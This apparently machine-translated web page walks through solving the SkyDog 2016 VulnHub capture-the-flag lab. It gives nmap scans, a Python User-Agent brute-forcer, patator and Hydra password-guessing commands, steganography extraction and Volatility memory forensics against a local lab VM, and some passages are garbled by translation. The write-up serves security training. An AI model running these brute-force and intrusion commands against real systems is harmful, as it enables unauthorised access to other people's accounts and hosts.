<!doctype html>
<html class="no-js" lang="en">

<head>
  <!-- Global site tag (gtag.js) - Google Analytics -->
  <script async src="https://www.googletagmanager.com/gtag/js?id=UA-134931760-1"></script>
  <script>
    window.dataLayer = window.dataLayer || [];
    function gtag(){dataLayer.push(arguments);}
    gtag('js', new Date());

    gtag('config', 'UA-134931760-1');
  </script>

  <meta charset="utf-8">
  <meta http-equiv="x-ua-compatible" content="ie=edge">
  <title>VulnHub Analysis of tasks with CTF SkyDog: 2016 - Catch Me If You Can</title>
  <link rel="icon" type="image/x-icon" href="/favicon.ico" />
  <meta name="description" content="We continue analysis a lab with VulnHub . At this time, we will analyze the CTF solution from the recent information security conference SkyDog Con . ...">
  <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">

  <link rel="stylesheet" href="../../css/main.css">

  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.3.1/jquery.min.js"></script>
  <script>window.jQuery || document.write('<script src="../../js/vendors/jquery-3.3.1.min.js"><\/script>')</script>

  <script async src="//pagead2.googlesyndication.com/pagead/js/adsbygoogle.js"></script>
  <script>
       (adsbygoogle = window.adsbygoogle || []).push({
            google_ad_client: "ca-pub-6974184241884155",
            enable_page_level_ads: true
       });
  </script>
</head>

<body>
  <!--[if lte IE 9]>
    <p class="browserupgrade">You are using an <strong>outdated</strong> browser. Please <a href="https://browsehappy.com/">upgrade your browser</a> to improve your experience and security.</p>
  <![endif]-->
  <header class="page-header js-page-header">
    <a class="page-header-logo-container" href="https://weekly-geekly.github.io/index.html"></a>
    <div class="page-header-text">Geekly Articles each Day</div>
  </header>
  <nav class="page-headings-container js-page-headings-container"></nav>
  <div class="tools-bar js-tools-bar">
    <!-- <a href="../../search.html" title="Search">üîé</a> -->
    <a class="js-list-of-headings-button" data-state="closed" href="#" title="Headings">üìú</a>
    <a class="js-go-to-top-button" href="#" title="Go to Top">‚¨ÜÔ∏è</a>
    <a class="js-go-to-bottom-button" href="#" title="Go to Bottom">‚¨áÔ∏è</a>
  </div>
  <a href="http://bit.ly/donateToWeeklyGeekly" class="donate-btn">DONATE</a>
  <section class="page js-page"><h1>VulnHub Analysis of tasks with CTF SkyDog: 2016 - Catch Me If You Can</h1><div class="post__text post__text-html js-mediator-article"><div style="text-align:center;"><img src="https://habrastorage.org/files/f68/722/438/f6872243880b4e7ab552a69ebee3d78e.png"></div><br>  We continue analysis a lab with <a href="https://www.vulnhub.com/">VulnHub</a> .  At this time, we will analyze the <a href="https://www.vulnhub.com/entry/skydog-2016-catch-me-if-you-can,166/">CTF</a> solution from the recent information security <a href="http://www.skydogcon.com/">conference SkyDog Con</a> . <br><a name="habracut"></a><br><h3>  Let's start </h3><br>  Download the image for VirtualBox, launch it and as usual look at the output of nmap  ªa: <br><br><pre><code class="bash hljs">sudo nmap 192.168.1.174 -sV -sC -p1-65535</code> </pre> <br><div class="spoiler">  <b class="spoiler_title">Hidden text</b> <div class="spoiler_text"><blockquote>  Starting Nmap 7.01 ( <a href="https://nmap.org/">nmap.org</a> ) at 2016-12-18 19:39 MSK <br>  Nmap scan report for 192.168.1.174 <br>  Host is up (0.00032s latency). <br>  PORT STATE SERVICE VERSION <br>  22 / tcp closed ssh <br>  80 / tcp open http Apache httpd 2.4.18 ((Ubuntu)) <br>  | _http-server-header: Apache / 2.4.18 (Ubuntu) <br>  | _http-title: SkyDog Con CTF 2016 - Catch Me If You Can <br>  443 / tcp open ssl / http Apache httpd 2.4.18 ((Ubuntu)) <br>  | _http-server-header: Apache / 2.4.18 (Ubuntu) <br>  | _http-title: 400 Bad Request <br>  |  ssl-cert: Subject: commonName = Network Solutions EV Server CA 2 / organizationName = Network Solutions LLC / stateOrProvinceName = VA / countryName = US <br>  |  Not valid before: 2016-09-21T14: 51: 57 <br>  | _Not valid after: 2017-09-21T14: 51: 57 <br>  | _ssl-date: TLS randomness does not represent time <br>  22222 / tcp open ssh OpenSSH 7.2p2 Ubuntu 4ubuntu2.1 (Ubuntu Linux; protocol 2.0) <br>  |  ssh-hostkey: <br>  |  2048 b6: 64: 7c: d1: 55: 46: 4e: 50: e3: ba: cf: 4c: 1e: 81: f9: db (RSA) <br>  | _ 256 ef: 17: df: cc: db: 2e: c5: 24: e3: 9e: 25: 16: 3d: 25: 68: 35 (ECDSA) <br>  MAC Address: 08: 00: 27: D3: 70: 74 (Oracle VirtualBox virtual NIC) <br>  Device type: general purpose <br>  Running: Linux 3.X | 4.X <br>  OS CPE: cpe: / o: linux: linux_kernel: 3 cpe: / o: linux: linux_kernel: 4 <br>  OS details: Linux 3.10 - 4.1 <br>  Network Distance: 1 hop <br>  Service Info: OS: Linux;  CPE: cpe: / o: linux: linux_kernel </blockquote></div></div><br>  We have 3 ports of SSH (22222), HTTP (80), HTTPS (443). <br><br><h3>  Flag # 1 - ‚ÄúDon't go Home Frank!  There's a Hex on Your House ¬ª </h3><br>  Judging from the description of the first flag, we need to look for something similar to the HEX sequence. 
      <br>
        <script async src="//pagead2.googlesyndication.com/pagead/js/adsbygoogle.js"></script>
        <ins class="adsbygoogle"
          style="display:block; text-align:center;"
          data-ad-layout="in-article"
          data-ad-format="fluid"
          data-ad-client="ca-pub-6974184241884155"
          data-ad-slot="8945601208"></ins>
        <script>
          (adsbygoogle = window.adsbygoogle || []).push({});
        </script>
      <br>
      A quick inspection of the site did not give any result, the scan of files and directories didn‚Äôt clarify the situation either <br><br><pre> <code class="bash hljs">sudo dirsearch -u http://192.168.1.174 -e php,txt,json,bak,html -w /usr/share/dirb/wordlists/big.txt -r -f</code> </pre> <br><img src="https://habrastorage.org/files/a12/42a/a7d/a1242aa7ddee4ba886b6d563fe5fd10b.png"><br><br>  Looking into the code of the main page we see the following: <br><br><pre> <code class="hljs xml"><span class="hljs-tag"><span class="hljs-tag">&lt;/</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">div</span></span></span><span class="hljs-tag">&gt;</span></span> <span class="hljs-comment"><span class="hljs-comment">&lt;!--[if IE 8]&gt; &lt;html lang="en" class="ie8"&gt; &lt;![endif]--&gt;</span></span> <span class="hljs-comment"><span class="hljs-comment">&lt;!--[if IE 9]&gt; &lt;html lang="en" class="ie9"&gt; &lt;![endif]--&gt;</span></span> <span class="hljs-comment"><span class="hljs-comment">&lt;!--[If IE4]&gt;&lt;script src="/oldIE/html5.js"&gt;&lt;/script&gt;&lt;![Make sure to remove this before going to PROD]--&gt;</span></span> <span class="hljs-comment"><span class="hljs-comment">&lt;!--[if !IE]&gt;&lt;!--&gt;</span></span> <span class="hljs-comment"><span class="hljs-comment">&lt;!-- Header --&gt;</span></span></code> </pre> <br>  Hmm, it's strange why you need to remove this code before publishing.  I‚Äôll look inside <i>/oldIE/html5.js</i> , we find the very HEX sequence mentioned in the flag description: <br><br><img src="https://habrastorage.org/files/268/600/bb2/268600bb2f9f4f76ae823ae9589cb4cc.png"><br><br>  We decode and get the first flag: <i>flag {7c0132070a0ef71d542663e9dc1f5dee}</i> .  This is md5 from <i>nmap</i> . <br><br><h3>  Flag # 2 - ‚ÄúObscurity or Security?  That is the Question ¬ª </h3><br>  Dirsearch gave us 403 on the page <i>/ personnel</i> .  We try to open it in order to find out the details, in response we receive a single message: <br><blockquote>  ACCESS DENIED !!!  You Do Not Appear To Be Coming From An FBI Workstation.  Preparing Interrogation Room 1. Car Batteries Charging .... </blockquote><br>  Having tried to change the <i>User-Agent</i> in the request, we get the same result.  Nikto did not help us here either, as well as the hope that another version of the site is running on https.  Assuming that there was a hint in flag 1, and once again looking at the log, we recall the non-standard ssh port.  Connecting there as root: <br><br><pre> <code class="bash hljs">ssh root@192.168.1.174 -p 22222</code> </pre> <br><img src="https://habrastorage.org/files/6d4/813/a92/6d4813a92e694a379cee2b851209aa7d.png"><br><br>  Find the second flag: <i>Flag {53c82eba31f6d416f331de9162ebe997}</i> , in which the <i>encrypt</i> hash <br><br><h3>  Flag # 3 - ‚ÄúDuring his Travels Frank has been Been Known to Intercept Traffic‚Äù </h3><br>  And so, we are talking about intercepting traffic, the previous flag refers us to encryption.  It is not difficult to guess what you need to look into the SSL traffic dump, which comes when the page loads. <br>  We launch Wireshark, set up a filter for displaying packets only from the site: <br><br><blockquote>  ip.addr == 192.168.1.174 </blockquote><br>  Go to <i><a href="https://192.168.1.174/">192.168.1.174</a></i> , click on the links that are available to us, and then go on to view the traffic: <br><br><img src="https://habrastorage.org/files/45f/8d3/8b2/45f8d38b2c4f44e8a1fe8a331212bddc.png"><br><br>  Flag found: <i>flag3 {f82366a9ddc064585d54e3f78bde3221}</i> , this turns out to be a hash from the <i>personnel</i> <br><br>  PS As it turned out later, the flag could be found simply by looking in the browser into the https properties of the certificate: <br><br><div class="spoiler">  <b class="spoiler_title">Hidden text</b> <div class="spoiler_text"><img src="https://habrastorage.org/files/b18/62b/fdf/b1862bfdf11e4a23ad0743b4cdb3e752.png"><br></div></div><br><h3>  Flag # 4 - "A Good Agent Is Hard To Find" </h3><br>  From the third flag and description, it follows that my initial assumption that the correct User-Agent is required to enter the page <i>/ personnel</i> , turned out to be true. <br><br>  Download the <a href="">list of</a> all User-Agent `s.  Next, using the following Python script, run the brute force. <br><br><pre> <code class="python hljs"><span class="hljs-keyword"><span class="hljs-keyword">import</span></span> requests <span class="hljs-keyword"><span class="hljs-keyword">import</span></span> sys url = <span class="hljs-string"><span class="hljs-string">'http://192.168.1.174/personnel'</span></span> ua_file = sys.argv[<span class="hljs-number"><span class="hljs-number">1</span></span>] head = {<span class="hljs-string"><span class="hljs-string">'User-Agent'</span></span>:<span class="hljs-string"><span class="hljs-string">''</span></span>} bad_resp = <span class="hljs-string"><span class="hljs-string">'ACCESS DENIED!!! You Do Not Appear To Be Coming From An FBI Workstation. Preparing Interrogation Room 1. Car Batteries Charging....'</span></span> file = open(ua_file, <span class="hljs-string"><span class="hljs-string">'r'</span></span>).read().splitlines() <span class="hljs-keyword"><span class="hljs-keyword">for</span></span> item <span class="hljs-keyword"><span class="hljs-keyword">in</span></span> file: head[<span class="hljs-string"><span class="hljs-string">'User-Agent'</span></span>] = item.strip() req = requests.get(url, headers=head) <span class="hljs-keyword"><span class="hljs-keyword">if</span></span> req.text != bad_resp: print(<span class="hljs-string"><span class="hljs-string">'Found UA: %s'</span></span> %(item)) print(req.text)</code> </pre> <br>  The result was not long in coming: <br><br><div class="spoiler">  <b class="spoiler_title">List of found User-Agent lines</b> <div class="spoiler_text"><blockquote>  Found UA: Mozilla / 4.0 (compatible; MSIE 4.01; AOL 4.0; Windows 98) <br>  Found UA: Mozilla / 4.0 (compatible; MSIE 4.01; AOL 4.0; Windows 95) <br>  Found UA: Mozilla / 4.0 (compatible; MSIE 4.01; AOL 4.0; Mac_68K) <br>  Found UA: Mozilla / 4.0 PPC (compatible; MSIE 4.01; Windows CE; PPC; 240x320; Sprint: PPC-6700; PPC; 240x320) <br>  Found UA: Mozilla / 4.0 (compatible; MSIE 4.01; Windows NT) <br>  Found UA: Mozilla / 4.0 (compatible; MSIE 4.01; Windows NT 5.0) <br>  Found UA: Mozilla / 4.0 (compatible; MSIE 4.01; Windows CE; Sprint; PPC-i830; PPC; 240x320) <br>  Found UA: Mozilla / 4.0 (compatible; MSIE 4.01; Windows CE; Sprint; SCH-i830; PPC; 240x320) <br>  Found UA: Mozilla / 4.0 (compatible; MSIE 4.01; Windows CE; Sprint: SPH-ip830w; PPC; 240x320) <br>  Found UA: Mozilla / 4.0 (compatible; MSIE 4.01; Windows CE; Sprint: SPH-ip320; Smartphone; 176x220) <br>  Found UA: Mozilla / 4.0 (compatible; MSIE 4.01; Windows CE; Sprint: SCH-i830; PPC; 240x320) <br>  Found UA: Mozilla / 4.0 (compatible; MSIE 4.01; Windows CE; Sprint: SCH-i320; Smartphone; 176x220) <br>  Found UA: Mozilla / 4.0 (compatible; MSIE 4.01; Windows CE; Sprint: PPC-i830; PPC; 240x320) <br>  Found UA: Mozilla / 4.0 (compatible; MSIE 4.01; Windows CE; Smartphone; 176x220) <br>  Found UA: Mozilla / 4.0 (compatible; MSIE 4.01; Windows CE; PPC; 240x320; Sprint: PPC-6700; PPC; 240x320) <br>  Found UA: Mozilla / 4.0 (compatible; MSIE 4.01; Windows CE; PPC; 240x320; PPC) <br>  Found UA: Mozilla / 4.0 (compatible; MSIE 4.01; Windows CE; PPC) <br>  Found UA: Mozilla / 4.0 (compatible; MSIE 4.01; Windows CE) <br>  Found UA: Mozilla / 4.0 (compatible; MSIE 4.01; Windows 98; Hotbar 3.0) <br>  Found UA: Mozilla / 4.0 (compatible; MSIE 4.01; Windows 98; DigExt) <br>  Found UA: Mozilla / 4.0 (compatible; MSIE 4.01; Windows 98) <br>  Found UA: Mozilla / 4.0 (compatible; MSIE 4.01; Windows 95) <br>  Found UA: Mozilla / 4.0 (compatible; MSIE 4.01; Mac_PowerPC) <br>  Found UA: Mozilla / 4.0 WebTV / 2.6 (compatible; MSIE 4.0) <br>  Found UA: Mozilla / 4.0 (compatible; MSIE 4.0; Windows NT) <br>  Found UA: Mozilla / 4.0 (compatible; MSIE 4.0; Windows 98) <br>  Found UA: Mozilla / 4.0 (compatible; MSIE 4.0; Windows 95; .NET CLR 1.1.4322; .NET CLR 2.0.50727) <br>  Found UA: Mozilla / 4.0 (compatible; MSIE 4.0; Windows 95) <br>  Found UA: Mozilla / 4.0 (Compatible; MSIE 4.0) <br>  Found UA: Mozilla / 2.0 (compatible; MSIE 4.0; Windows 98) <br>  Found UA: nuSearch Spider (compatible; MSIE 4.01; Windows NT) </blockquote><br></div></div><br>  Apparently, the FBI uses only MSIE 4.0 :) After replacing the User-Agent in the browser and following the link, we get to the FBI Portal agent Hanratty, and at the bottom of the page we see another flag: <br><br><img src="https://habrastorage.org/files/7ad/80d/eef/7ad80deefa634f16a53be65cea3545d2.png"><br><br>  <a href="http://www.md5online.org/">md5online has</a> kindly said that this is a hash from <i>evidence</i> . <br><br><h3>  Flag # 5 - ‚ÄúThe Devil is in the Details - Or is it Dialogue?  Either Way, if it's Simple, Guessable, or Personal it Goes Against Best Practices ¬ª </h3><br>  Next to the flag, we can observe another hint: this is <i>newevidence</i> .  And from the description of the flag it follows that you need to look for details. <br><br>  The difference between not sorted and sorted lists is immediately apparent, as well as a few more details, after collecting everything in a pile, we get the following list: <br><blockquote>  Manhattan <br>  Heidelbery <br>  Great American Masterpiece <br>  Miami <br>  July 16, 2009 <br>  617468 <br>  inconsequential <br>  newevidence <br>  Hanratty </blockquote><br>  After a long search for these keywords, you can stumble upon a <a href="http://www.spielberg-ocr.com/hanratty.html">link</a> .  Having looked through it we find: <br><blockquote>  Agent Carl Hanratty - the hero of the work <br>  Catch Me If You Can - Book <br>  Miami - Scene 17 Movie <br>  Heidelberg - the printing machine from the movie </blockquote><br>  We continue by scoring this list in a file, and running a search of directories and files, we find something interesting: <br><br><img src="https://habrastorage.org/files/4e5/9f6/ad6/4e59f6ad67284b2b940c21c2bb76b813.png"><br><br>  Great, we found an authorization form!  We have a user: <i>Carl Hanratty</i> , from the name of the flag we can assume that the password is something simple - personal information. <br><br>  Let's start busting.  Generating a dictionary of probable logins, launch the <a href="https://github.com/lanjelot/patator">patator</a> , feed it a set of <a href="https://github.com/danielmiessler/SecLists">SecLists</a> dictionaries <br><br><pre> <code class="bash hljs"><span class="hljs-keyword"><span class="hljs-keyword">for</span></span> item <span class="hljs-keyword"><span class="hljs-keyword">in</span></span> $(find SecLists/ -name <span class="hljs-string"><span class="hljs-string">"*\.txt"</span></span>); <span class="hljs-keyword"><span class="hljs-keyword">do</span></span> sudo patator http_fuzz url=http://192.168.1.174/newevidence auth_type=basic accept_cookie=1 follow=1 -x ignore:code=401 header=<span class="hljs-string"><span class="hljs-string">'User-Agent: Mozilla/4.0 (compatible; MSIE 4.01; Windows NT 5.0)'</span></span> user_pass=<span class="hljs-string"><span class="hljs-string">"FILE0:FILE1"</span></span> 0=logins.txt 1=<span class="hljs-variable"><span class="hljs-variable">$item</span></span>; <span class="hljs-keyword"><span class="hljs-keyword">done</span></span></code> </pre> <br>  And after some time we get the original combination: <br><blockquote>  INFO - 200 1462: 676 0.011 |  carl.hanratty: Grace |  37586 |  HTTP / 1.1 200 OK </blockquote><br>  PS Having studied in detail a film or a book, it becomes clear that Grace is the daughter of Carl. <br><br>  After authorization we get to the page: <br><img src="https://habrastorage.org/files/ebd/366/d4d/ebd366d4d41249af8e490fa793c3e2e4.png"><br><br>  And by clicking on one of the links we find the flag: <i>flag {117c240d49f54096413dd64280399ea9}</i> .  After decryption, we get the word: <i>panam</i> <br><br><h3>  Flag # 6 - "Where in the World is Frank?" </h3><br>  ‚ÄúWhere is Frank?‚Äù - hmm ... Returning to the site we see the link <i>Possible Location</i> , clicking on which, we get a picture: <br><br><div class="spoiler">  <b class="spoiler_title">Hidden text</b> <div class="spoiler_text"><img src="https://habrastorage.org/files/12d/66b/cd3/12d66bcd307f4edbb0fbf3cff07fd0b2.jpg"><br></div></div><br>  The picture is quite voluminous, which suggests that there is something else in it <br><br><pre> <code class="bash hljs">sudo binwalk image.jpg</code> </pre> <br><img src="https://habrastorage.org/files/64b/231/b04/64b231b0495d4b8a93a4c6b7d864d4b7.png"><br><br>  In the picture we have an index file MyISAM on 2Mb.  Online you can find a <a href="https://dev.mysql.com/doc/internals/en/the-myi-file.html">description of the</a> format of this file.  Having studied it, we understand that MySQL indices cannot contain the flag we are looking for.  Further assuming that we are dealing with steganography, let's look at the output of <i>steghide</i> . <br><br>  After the execution of the command, we have a password request. <br><br><pre> <code class="bash hljs">steghide info image.jpg</code> </pre> <br>  Hmm, interestingly, we try to enter <i>panam,</i> we get this conclusion: <br><blockquote>  "Image.jpg": <br>  format: jpeg <br>  capacity: 230.1 KB <br>  Try to get information about embedded data?  (y / n) y <br>  Enter passphrase: <br>  embedded file "flag.txt": <br>  size: 71,0 Byte <br>  encrypted: rijndael-128, cbc <br>  compressed: yes <br></blockquote><br>  Extract the file, find the next flag <i>flag {d1e5146b171928731385eb7ea38c37b8}</i> in the file and a new hint: <i>clue = iheartbrenda</i> <br><br><h3>  Flag # 7 - ‚ÄúFrank Was Caught On The Camera‚Äù - ‚ÄúThe Fastest Man Alive!‚Äù </h3><br>  Going on the flag description, you can find a reference to the TV series <a href="https://www.youtube.com/watch%3Fv%3D8rrjSkGx4V0">FLASH</a> , and looking at the <a href="https://en.wikipedia.org/wiki/Catch_Me_If_You_Can">wiki</a> we learn the following: <br><br><div class="spoiler">  <b class="spoiler_title">Movie spoiler</b> <div class="spoiler_text"><blockquote>  Frank calls him, attempting to apologize for duping Carl.  He really wants to be caught, but he really realizes  Frank hangs up, and Carl Allen comes to a flash, she is really a teenager. <br><br>  The lawyer and lawyer.  While playing Dr.  Frank Conners, he falls in love with Brenda (Amy Adams). </blockquote><br></div></div><br>  But what can these tips mean?  Remembering the forgotten at the very beginning of ssh.  Everything immediately began to converge.  We have 2 phrases <i>iheartbrenda</i> and <i>ILoveFrance</i> , and a few new names: <br><br><div class="spoiler">  <b class="spoiler_title">Generic dictionary</b> <div class="spoiler_text">  Give the script a couple's first <i>name last name</i> <br><blockquote>  Frank conners <br>  Barry allen <br>  Carl hanratty </blockquote><br><pre> <code class="python hljs"><span class="hljs-comment"><span class="hljs-comment">#!/bin/bash import sys def Usage(): print('Usage: ./NtoL.py [namelist]') exit(0) if len(sys.argv) &lt;= 1: Usage() nameList = open(sys.argv[1]).read().splitlines() out = open(sys.argv[1], 'w') for item in nameList: item = item.split(' ') out.write( '%s%s\n' %(item[0], item[1]) ) out.write( '%s.%s\n' %(item[0], item[1]) ) out.write( '%s%s\n' %(item[0][0], item[1]) ) out.write( '%s.%s\n' %(item[0][0], item[1]) ) out.write( ('%s%s\n' %(item[0], item[1])).lower() ) out.write( ('%s.%s\n' %(item[0], item[1])).lower() ) out.write( ('%s%s\n' %(item[0][0], item[1])).lower() ) out.write( ('%s.%s\n' %(item[0][0], item[1])).lower() ) out.close()</span></span></code> </pre> <br>  At the output we get the following dictionary of logins for iteration: <br><blockquote>  Carlhanratty <br>  Carl.Hanratty <br>  Chanratty <br>  C.Hanratty <br>  carlhanratty <br>  carl.hanratty <br>  chanratty <br>  c.hanratty <br>  Barryallen <br>  Barry.Allen <br>  BAllen <br>  B.Allen <br>  barryallen <br>  barry.allen <br>  ballen <br>  b.allen <br>  FrankConners <br>  Frank.Conners <br>  FConners <br>  F.Conners <br>  frankconners <br>  frank.conners <br>  fconners <br>  f.conners </blockquote><br></div></div><br>  We send everything to Hydra and the result does not take long: <br><pre> <code class="bash hljs">hydra -L logins.txt -P flag7pwd ssh://192.168.1.174 -s 22222</code> </pre> <br><img src="https://habrastorage.org/files/3df/8db/939/3df8db93996c48c6b201829df4a51904.png"><br><br>  Enter and immediately find the flag: <br><br><img src="https://habrastorage.org/files/335/cd7/614/335cd7614fbe4cddb28a3a615874aa48.png"><br><br>  After decoding the flag we get: <i>theflash</i> <br><br><h3>  Flag # 8 - ‚ÄúFranks Lost His Mind or Maybe it's His Memory.  He's Locked Himself Inside the Building.  Find the Code to Unlock the Door Before He Gets Himself Killed! ‚Äù </h3><br>  In the same directory in which we found the flag, there is a suspicious file: <i>security-system.data</i> <br>  Download it for yourself, for further analysis: <br><br><pre> <code class="bash hljs">scp -P 22222 barryallen@192.168.1.174:~/security-system.data ./</code> </pre> <br>  And so before us the archive, unpack it: <br><br><pre> <code class="bash hljs">$ file security-system.data security-system.data: Zip archive data, at least v2.0 to extract $ 7z x -oSS security-system.data $ <span class="hljs-built_in"><span class="hljs-built_in">cd</span></span> ./SS $ ls security-system.data $ file security-system.data security-system.data: data</code> </pre> <br>  The format was not defined, but the size is 1GB.  <i>Binwalk</i> did not give any intelligible information, so let's try <i>volatility</i> : <br><br><pre> <code class="bash hljs">volatility -f security-system.data imageinfo</code> </pre> <br><blockquote>  Volatility Foundation Volatility Framework 2.5 <br>  INFO: volatility.debug: Determining profile based on KDBG search ... <br>  Suggested Profile (s): WinXPSP2x86, WinXPSP3x86 (Instantiated with WinXPSP2x86) <br>  AS Layer1: IA32PagedMemoryPae (Kernel AS) <br>  AS Layer2: FileAddressSpace (/CTF/VulnHub/SkyDog2016/SS/security-system.data) <br>  PAE type: PAE <br>  DTB: 0x33e000L <br>  KDBG: 0x80545b60L <br>  Number of Processors: 1 <br>  Image Type (Service Pack): 3 <br>  KPCR for CPU 0: 0xffdff000L <br>  KUSER_SHARED_DATA: 0xffdf0000L <br>  Image date and time: 2016-10-10 22:00:50 UTC + 0000 <br>  Image local date and time: 2016-10-10 18:00:50 - 0400 </blockquote><br>  Great, we have a memory dump of WinXP OS.  We will begin to extract useful information from it, and we will start with the <i>cmdline</i> module, since it is the first in the list and most interesting: <br><br><pre> <code class="bash hljs">volatility -f security-system.data --profile=WinXPSP2x86 cmdline</code> </pre> <br><div class="spoiler">  <b class="spoiler_title">cmdline</b> <div class="spoiler_text">  Volatility Foundation Volatility Framework 2.5 <br>  ************************************************** ********************** <br>  System pid: 4 <br>  ************************************************** ********************** <br>  smss.exe pid: 332 <br>  Command line: \ SystemRoot \ System32 \ smss.exe <br>  ************************************************** ********************** <br>  csrss.exe pid: 560 <br>  Command line: C: \ WINDOWS \ system32 \ csrss.exe ObjectDirectory = \ Windows SharedSection = 1024,3072,512 Windows = On SubSystemType = Windows ServerDll = basesrv, 1 ServerDll = winsrv: UserServerDllInitialization, 3 ServerDll = winsrv: ConSererDIntentnIntectllInitialization, 3 ServerDll = winsrv: ConSererDIntentry, 5 = Off MaxRequestThreads = 16 <br>  ************************************************** ********************** <br>  winlogon.exe pid: 588 <br>  Command line: winlogon.exe <br>  ************************************************** ********************** <br>  services.exe pid: 664 <br>  Command line: C: \ WINDOWS \ system32 \ services.exe <br>  ************************************************** ********************** <br>  lsass.exe pid: 676 <br>  Command line: C: \ WINDOWS \ system32 \ lsass.exe <br>  ************************************************** ********************** <br>  vmacthlp.exe pid: 848 <br>  Command line: "C: \ Program Files \ VMware \ VMware Tools \ vmacthlp.exe" <br>  ************************************************** ********************** <br>  svchost.exe pid: 860 <br>  Command line: C: \ WINDOWS \ system32 \ svchost -k DcomLaunch <br>  ************************************************** ********************** <br>  svchost.exe pid: 944 <br>  Command line: C: \ WINDOWS \ system32 \ svchost -k rpcss <br>  ************************************************** ********************** <br>  svchost.exe pid: 1040 <br>  Command line: C: \ WINDOWS \ System32 \ svchost.exe -k netsvcs <br>  ************************************************** ********************** <br>  svchost.exe pid: 1092 <br>  Command line: C: \ WINDOWS \ system32 \ svchost.exe -k NetworkService <br>  ************************************************** ********************** <br>  svchost.exe pid: 1144 <br>  Command line: C: \ WINDOWS \ system32 \ svchost.exe -k LocalService <br>  ************************************************** ********************** <br>  explorer.exe pid: 1540 <br>  Command line: C: \ WINDOWS \ Explorer.EXE <br>  ************************************************** ********************** <br>  spoolsv.exe pid: 1636 <br>  Command line: C: \ WINDOWS \ system32 \ spoolsv.exe <br>  ************************************************** ********************** <br>  VGAuthService.e pid: 1900 <br>  Command line: "C: \ Program Files \ VMware \ VMware Tools \ VMware VGAuth \ VGAuthService.exe" <br>  ************************************************** ********************** <br>  vmtoolsd.exe pid: 2012 <br>  Command line: "C: \ Program Files \ VMware \ VMware Tools \ vmtoolsd.exe" <br>  ************************************************** ********************** <br>  wmiprvse.exe pid: 488 <br>  Command line: C: \ WINDOWS \ system32 \ wbem \ wmiprvse.exe <br>  ************************************************** ********************** <br>  wscntfy.exe pid: 536 <br>  Command line: C: \ WINDOWS \ system32 \ wscntfy.exe <br>  ************************************************** ********************** <br>  alg.exe pid: 624 <br>  Command line: C: \ WINDOWS \ System32 \ alg.exe <br>  ************************************************** ********************** <br>  vmtoolsd.exe pid: 1352 <br>  Command line: "C: \ Program Files \ VMware \ VMware Tools \ vmtoolsd.exe" -n vmusr <br>  ************************************************** ********************** <br>  ctfmon.exe pid: 1356 <br>  Command line: "C: \ WINDOWS \ system32 \ ctfmon.exe" <br>  ************************************************** ********************** <br>  CCleaner.exe pid: 1388 <br>  Command line: "C: \ Program Files \ CCleaner \ CCleaner.exe" / MONITOR <br>  ************************************************** ********************** <br>  cmd.exe pid: 1336 <br>  Command line: "C: \ WINDOWS \ system32 \ cmd.exe" <br>  ************************************************** ********************** <br>  wuauclt.exe pid: 1884 <br>  Command line: "C: \ WINDOWS \ system32 \ wuauclt.exe" / RunStoreAsComServer Local \ [410] SUSDS4ea33fbaffc4ad40bbd1dc3ac93ee5cb <br>  ************************************************** ********************** <br>  wuauclt.exe pid: 1024 <br>  Command line: "C: \ WINDOWS \ system32 \ wuauclt.exe" <br>  ************************************************** ********************** <br>  notepad.exe pid: 268 <br>  Command line: "C: \ WINDOWS \ system32 \ NOTEPAD.EXE" C: \ Documents and Settings \ test \ Desktop \ code.txt <br>  ************************************************** ********************** <br>  cmd.exe pid: 1276 </div></div><br>  The file <i>code.txt was</i> last edited.  By running the following <i>cmdscan</i> module, we find another interesting entry: <br><br><pre> <code class="bash hljs">volatility -f security-system.data --profile=WinXPSP2x86 cmdscan</code> </pre> <br><div class="spoiler">  <b class="spoiler_title">cmdscan</b> <div class="spoiler_text">  Volatility Foundation Volatility Framework 2.5 <br>  ************************************************** <br>  CommandProcess: csrss.exe Pid: 560 <br>  CommandHistory: 0x10186f8 Application: cmd.exe Flags: Allocated, Reset <br>  CommandCount: 2 LastAdded: 1 LastDisplayed: 1 <br>  FirstCommand: 0 CommandCountMax: 50 <br>  ProcessHandle: 0x2d4 <br>  Cmd # 0 @ 0x1024400: cd Desktop <br>  Cmd # 1 @ 0x4f2660: echo 66 6c 61 67 7b 38 34 31 64 64 33 64 62 32 39 62 30 66 62 62 63 38 63 37 62 35 62 65 37 36 38 63 64 63 38 31 7d&gt; code.txt <br></div></div><br>  After decoding this HEX sequence, for example, we get the last flag: <br>  <i>flag {841dd3db29b0fbbd89c7b5be768cdc81}</i> , which hashes the phrase: <i>Two [space] little [space] mice</i> <br><br>  Running the command: <br><br><pre> <code class="bash hljs">volatility -f security-system.data --profile=WinXPSP2x86 notepad</code> </pre> <br>  You can get a text dump from notepad, and make sure that this is the flag we need: <br><br><div class="spoiler">  <b class="spoiler_title">notepad</b> <div class="spoiler_text"><blockquote>  Volatility Foundation Volatility Framework 2.5 <br>  Process: 268 <br>  Text: <br>  ? <br><br>  Text: <br>  d <br><br>  Text: <br><br><br>  Text: <br>  ? <br><br>  Text: <br>  66 6c 61 67 7b 38 34 31 64 64 33 64 62 32 39 62 30 66 62 62 64 38 39 63 37 62 35 62 65 37 36 38 63 64 63 38 31 7d <br><br></blockquote><br></div></div><br>  CTF Pass! </div><p>Source: <a href="https://habr.com/ru/post/317878/">https://habr.com/ru/post/317878/</a></p>
<section class="more-articles-navigation-panel js-more-articles-navigation-panel">
<h4>More articles:</h4>
<nav class="list-of-articles-container js-list-of-articles-container"><ul class="list-of-pages js-list-of-pages">
<li><a href="../317868/index.html">The digest of interesting materials for the mobile # 184 developer (December 12-18)</a></li>
<li><a href="../317870/index.html">CRM pumped for sales</a></li>
<li><a href="../317872/index.html">Does your code speak Russian?</a></li>
<li><a href="../317874/index.html">Storage System for Billions of Records with Key Access</a></li>
<li><a href="../317876/index.html">FPGA Debug Board - Frankenstein. Sounds and music</a></li>
<li><a href="../317880/index.html">Why are we angry?</a></li>
<li><a href="../317882/index.html">Lock-free data structures. Iterable list</a></li>
<li><a href="../317884/index.html">Transaction Isolation Levels with PostgreSQL Examples</a></li>
<li><a href="../317886/index.html">The digest of fresh materials from the world of the frontend for the last week ‚Ññ241 (December 12 - 18, 2016)</a></li>
<li><a href="../317892/index.html">SwiftLint - clean and tidy iOS project</a></li>
</ul></nav>
</section><br />
<a href="../../allArticles.html"><strong>All Articles</strong></a>
<script src="../../js/main.js"></script>

